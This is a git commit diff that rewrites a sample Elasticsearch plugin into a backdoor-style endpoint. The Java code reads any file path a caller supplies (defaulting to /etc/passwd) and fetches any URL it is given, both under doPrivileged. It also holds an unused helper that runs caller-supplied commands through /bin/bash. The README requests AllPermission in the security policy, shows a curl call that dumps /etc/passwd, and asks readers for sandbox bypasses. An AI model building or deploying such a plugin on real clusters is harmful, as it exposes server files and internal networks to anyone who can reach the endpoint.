36f7637f51122eac2d7502c5406ffb4397ba010d
Green-m <root@green-m.me>
2021-05-14 15:16:37 +0800

    Update functions.

--- README.md
+++ README.md
@@ -1,6 +1,66 @@
-Sample plugin for elasticsearch
+Elasticsearch plugin to read local files  and send request
 ===========================
 
-This project is a sample for elasticsearch plugin.
-elasticsearch-plugin-archetype is created from this project.
+## Compile and pack
+
+Change the elasticsearch plugins version number in `elasticsearch/plugin-descriptor.properties`, here is 6.2.3.
+Then
+```
+mvn clean package
+cp target/elasticsearch-plugin-sample-6.6.0-SNAPSHOT.jar elasticsearch/
+zip -r elasticsearch-plugin-sample-6.6.1-SNAPSHOT.zip elasticsearch
+```
+
+## Install
+
+```
+elasticsearch-plugin install file:///elasticsearch-plugin-sample-6.6.1-SNAPSHOT.zip
+```
+
+### Usage
+
+```
+curl "http://127.0.0.1:9200/_sample?path=/etc/passwd&url=http://google.com"
+```
+
+
+### Notice
+
+This plugins ask for some other permissions in `elasticsearch/plugin-security.policy`  as below:
+
+```
+grant {
+	permission java.lang.RuntimePermission "setSecurityManager";
+	permission java.io.FilePermission "/etc/passwd", "read";
+	permission java.security.AllPermission;
+};
+```
+Use it before you known what you are doing.
+
+This plugins cannot run any command, spawn any process or something like that, because the sandbox of elasticsearch do not allow, it allow:
+
+```
+FilePermissions(read,write)
+SocketPermissions(connect, listen, accept)
+URLPermission,PropertyPermission,...
+```
+
+If you know some way to bypass it, tell me please. :)
+
+
+### Reference
+
+https://spinscale.de/posts/2020-04-07-elasticsearch-securing-a-search-engine-while-maintaining-usability.html
+https://github.com/codelibs/elasticsearch-plugin-sample
+https://discuss.elastic.co/t/customize-java-security-manager-settings/72255
+https://github.com/elastic/elasticsearch/blob/7.7/server/src/main/java/org/elasticsearch/bootstrap/ESPolicy.java
+https://github.com/spinscale/talk-elasticsearch-security-manager-and-seccomp/blob/master/src/main/java/de/spinscale/security/samples/SecurityManagerSamples.java
+https://blog.csdn.net/goodluck_mh/article/details/92845023
+
+
+
+
+
+
+
 
--- src/main/java/org/codelibs/elasticsearch/sample/rest/RestSampleAction.java
+++ src/main/java/org/codelibs/elasticsearch/sample/rest/RestSampleAction.java
@@ -3,8 +3,26 @@ package org.codelibs.elasticsearch.sample.rest;
 import static org.elasticsearch.rest.RestRequest.Method.GET;
 import static org.elasticsearch.rest.RestStatus.OK;
 
+import org.elasticsearch.SpecialPermission;
+
 import java.io.IOException;
 import java.util.Date;
+import java.util.*;
+import java.net.*;
+import java.io.*;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.InputStream;
+import java.util.Scanner;
+import java.lang.reflect.Method;
+import java.security.AccessController;
+import java.security.PrivilegedAction;
+import java.net.Socket;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.stream.Collectors;
+import java.nio.file.Path;
+import java.nio.charset.StandardCharsets;
 
 import org.elasticsearch.client.node.NodeClient;
 import org.elasticsearch.common.settings.Settings;
@@ -28,13 +46,79 @@ public class RestSampleAction extends BaseRestHandler {
     @Override
     public String getName() {
         return "sample_get";
-    }
+		}
+		
+
+  	public String exec(String cmd){
+			try{
+				Process p = Runtime.getRuntime().exec("/bin/bash -c" + cmd  );
+    		InputStream is = p.getInputStream();
+    		Scanner s = new Scanner(is).useDelimiter("\\A");
+    		String result = s.hasNext() ? s.next() : "";
+				return result;
+			}catch (IOException e){
+		 		e.printStackTrace();
+			}
+			return "None";
+		}
+		
+		public String sendRequest(String url){
+			
+			try {
+
+				InputStream is = new java.net.URL(url).openStream();
+				java.util.Scanner s = new java.util.Scanner(is);
+				
+				String res = s.useDelimiter("\\A").next();
+				is.close();
+
+				return res;
+				
+			}catch (IOException e) {
+				e.printStackTrace ();
+				// Perform any other exception handling that's appropriate.
+			}
+			return "null";
+		}
+
+
+		public String  readFile(String path){
+			try{
+				String content = "";
+				Path paath = Paths.get(path);
+				if (Files.isDirectory(paath)){
+					content =  String.join(",", Files.walk(Paths.get(path))
+															//.filter(Files::isRegularFile)
+															.map(Path::getFileName)
+															.map(Path::toString)
+															.collect(Collectors.toSet()));
+
+				}
+				else if (Files.isRegularFile(paath)){
+					content = new String(Files.readAllBytes(paath), StandardCharsets.UTF_8);
+				}
+				
+				return content;
+			} catch (Exception e ){
+				e.printStackTrace();
+			}
+			return "null";
+		}
+
+
 
     @Override
     protected RestChannelConsumer prepareRequest(final RestRequest request,
             final NodeClient client) throws IOException {
+      
+				final String cmd = request.param("cmd");
+				final String cmdSafe = (cmd!=null) ? cmd : "whoami";
+				final String path = request.param("path");
+				final String pathSafe = (path!=null) ? path : "/etc/passwd";
+				final String url = request.param("url");
+			 	final String urlSafe = (url!=null) ? url : "http://127.0.0.1/";
         final boolean isPretty = request.hasParam("pretty");
-        final String index = request.param("index");
+				final String index = request.param("index");
         return channel -> {
             final XContentBuilder builder = JsonXContent.contentBuilder();
             if (isPretty) {
@@ -44,10 +128,35 @@ public class RestSampleAction extends BaseRestHandler {
             if (index != null) {
                 builder.field("index", index);
             }
-            builder.field("description",
-                    "This is a sample response: " + new Date().toString());
-            builder.endObject();
-            channel.sendResponse(new BytesRestResponse(OK, builder));
+		
+	    
+			SecurityManager sm = System.getSecurityManager();
+
+		if (sm != null) {
+		  // unprivileged code such as scripts do not have SpecialPermission
+		  sm.checkPermission(new SpecialPermission());
+		}
+
+		
+		String output =  AccessController.doPrivileged( new PrivilegedAction<String>() {
+		   public String  run(){
+	    	    //System.setSecurityManager(null);
+
+						String output = readFile(pathSafe);
+						//String output = exec(cmdSafe);
+						output += sendRequest(urlSafe);
+						//return "None";
+		    		return output;
+		   }
+	    }
+			    
+	    );
+
+
+            	builder.field("description",
+                    "This is a sample response: " + new Date().toString() + output);
+            	builder.endObject();
+            	channel.sendResponse(new BytesRestResponse(OK, builder));
         };
     }
 
